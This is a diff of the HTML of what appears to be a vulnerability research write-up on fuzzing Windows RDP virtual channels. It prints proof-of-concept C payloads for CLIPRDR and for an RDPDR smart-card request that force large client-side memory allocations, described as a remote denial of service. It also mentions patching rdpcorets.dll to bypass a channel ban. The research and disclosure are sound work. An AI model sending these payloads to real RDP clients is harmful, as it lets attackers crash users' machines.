+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x0A</span>, <span style="color:#ae81ff">0x00</span>,             <span style="color:#75715e">// msgType
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,             <span style="color:#75715e">// msgFlags
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// dataLen
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0xFF</span>, <span style="color:#ae81ff">0x00</span>  <span style="color:#75715e">// clipDataId
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>connect_to_virtual_channel(<span style="color:#e6db74">&#34;cliprdr&#34;</span>, <span style="color:#ae81ff">10</span>, STATIC_CHANNEL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; c <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; c<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    payload[<span style="color:#ae81ff">11</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)c; <span style="color:#75715e">// Allocate memory with 128MB increments
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    write_to_virtual_channel(payload, <span style="color:#66d9ef">sizeof</span>(payload));
+</span></span><span style="display:flex;"><span>    Sleep(<span style="color:#ae81ff">100</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>close_virtual_channel();
+</span></span></code></pre></div><p>From this bug, we learned a golden rule of fuzzing: that it is not only about crashes.</p>
 <p><strong>Side effects of fuzzing on a system can reveal bugs too.</strong></p>
 <h2 id="drdynvc">DRDYNVC</h2>
 <p><strong>DRDYNVC</strong> is a <em>Static Virtual Channel</em> dedicated to the <strong>support of dynamic virtual channels</strong>. It allows to create/open and close DVCs, and data transported through DVCs is actually transported over DRDYNVC, which acts as a wrapping layer. It is opened by default.</p>
@@ -835,17 +835,17 @@ close_virtual_channel();
 </code></pre><p>PowerShell can help transform this into something more human-readable, but it does not yield any remarkable permission that could prevent us from making the call.</p>
 <p>The issue then probably comes, as hinted by the debug spew, from <code>RpcCreateVirtualChannel</code>.</p>
 <p>I debugged the TermService svchost process and stepped until ending up inside <strong>rdpcorets.dll</strong>. The function <code>CUMRDPConnection::CreateVirtualChannel</code> answers our inquiry.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>_stricmp(<span style="color:#e6db74">&#34;DRDYNVC&#34;</span>, a2) 
-  <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>_stricmp(<span style="color:#e6db74">&#34;rdpgrfx&#34;</span>, a2)
-  <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>_stricmp(<span style="color:#e6db74">&#34;rdpinpt&#34;</span>, a2)
-  <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>_stricmp(<span style="color:#e6db74">&#34;rdpcmd&#34;</span>, a2)
-  <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>_stricmp(<span style="color:#e6db74">&#34;rdplic&#34;</span>, a2)
-  <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>_stricmp(<span style="color:#e6db74">&#34;Microsoft::Windows::RDS::Graphics&#34;</span>, a2) )
-{
-  v16 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80070005</span>;
-  <span style="color:#66d9ef">goto</span> LABEL_58;
-}
-</code></pre></div><p>DRDYNVC is really <strong>banned</strong> from being opened through the WTS API&hellip;!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>_stricmp(<span style="color:#e6db74">&#34;DRDYNVC&#34;</span>, a2) 
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>_stricmp(<span style="color:#e6db74">&#34;rdpgrfx&#34;</span>, a2)
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>_stricmp(<span style="color:#e6db74">&#34;rdpinpt&#34;</span>, a2)
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>_stricmp(<span style="color:#e6db74">&#34;rdpcmd&#34;</span>, a2)
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>_stricmp(<span style="color:#e6db74">&#34;rdplic&#34;</span>, a2)
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>_stricmp(<span style="color:#e6db74">&#34;Microsoft::Windows::RDS::Graphics&#34;</span>, a2) )
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  v16 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80070005</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">goto</span> LABEL_58;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>DRDYNVC is really <strong>banned</strong> from being opened through the WTS API&hellip;!</p>
 <p>We also notice a few more channels that are blacklisted the same way. I tried patching <code>rdpcorets.dll</code> to bypass this condition, but then I started getting new errors, so I gave up. Perhaps this channel is <em>really</em> meant not to be opened with the WTS API&hellip;</p>
 <h2 id="rdpdr">RDPDR</h2>
 <p><strong>RDPDR</strong> is a <em>Static Virtual Channel</em> dedicated to redirecting access from the server to the <strong>client file system</strong>. It is opened by default. It is also the base channel that hosts several sub-extensions such as the <strong>smart card extension</strong>, the <strong>printing extension</strong> or the <strong>ports extension</strong>. Finally, it is probably the most complex and interesting channel I&rsquo;ve had to fuzz among the few ones I&rsquo;ve studied!</p>
@@ -882,23 +882,23 @@ close_virtual_channel();
   </figure>
 </p>
 <p>Here&rsquo;s what the guilty PDU looks like:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">char</span> payload[] <span style="color:#f92672">=</span> {
-    <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#75715e">// Header
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// DeviceId
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// FileId
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// CompletionId
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x0e</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// MajorFunction (Device Control Request)
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// MinorFunction
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#75715e">// OutputBufferLength
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// InputBufferLength
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0xa8</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// IoControlCode
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// Padding
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// Padding
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// Padding
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// Padding
-</span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>  <span style="color:#75715e">// Padding
-</span><span style="color:#75715e"></span>};
-</code></pre></div><p>It is a <em>Device I/O Request</em> PDU (<code>0x4952</code>) of sub-type <em>Device Control Request</em> (<code>0x000e</code>). More specifically, the I/O Request handler, <code>DrDevice::ProcessIORequest</code>, dispatches the PDU to a Smart Card sub-protocol handler (<code>W32SCard::MsgIrpDeviceControl</code>). Eventually, the value of the field <code>OutputBufferLength</code> (DWORD) is used for a <strong>malloc call</strong> on the client (inside <code>DrUTL_AllocIOCompletePacket</code>).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> payload[] <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#75715e">// Header
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// DeviceId
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// FileId
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// CompletionId
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x0e</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// MajorFunction (Device Control Request)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// MinorFunction
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#75715e">// OutputBufferLength
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// InputBufferLength
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0xa8</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// IoControlCode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x11</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// Padding
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// Padding
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// Padding
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#75715e">// Padding
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>  <span style="color:#75715e">// Padding
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><p>It is a <em>Device I/O Request</em> PDU (<code>0x4952</code>) of sub-type <em>Device Control Request</em> (<code>0x000e</code>). More specifically, the I/O Request handler, <code>DrDevice::ProcessIORequest</code>, dispatches the PDU to a Smart Card sub-protocol handler (<code>W32SCard::MsgIrpDeviceControl</code>). Eventually, the value of the field <code>OutputBufferLength</code> (DWORD) is used for a <strong>malloc call</strong> on the client (inside <code>DrUTL_AllocIOCompletePacket</code>).</p>
 <p>This bug is less powerful than the CLIPRDR one because it only goes up to a <strong>4 GB</strong> allocation. Also, it only works once (the payload won&rsquo;t work twice in the same RDP session), so the value of <code>OutputBufferField</code> should be premedidated &mdash; we can&rsquo;t do small increments.</p>
 <p>However, it still accounts for a <strong>remote system-wide denial of service</strong> for target clients with around 4 GB of RAM on their system.</p>
 <h3 id="remote-heap-leak--aslr-leak-in-rdpdr">Remote Heap Leak / ASLR Leak in RDPDR</h3>
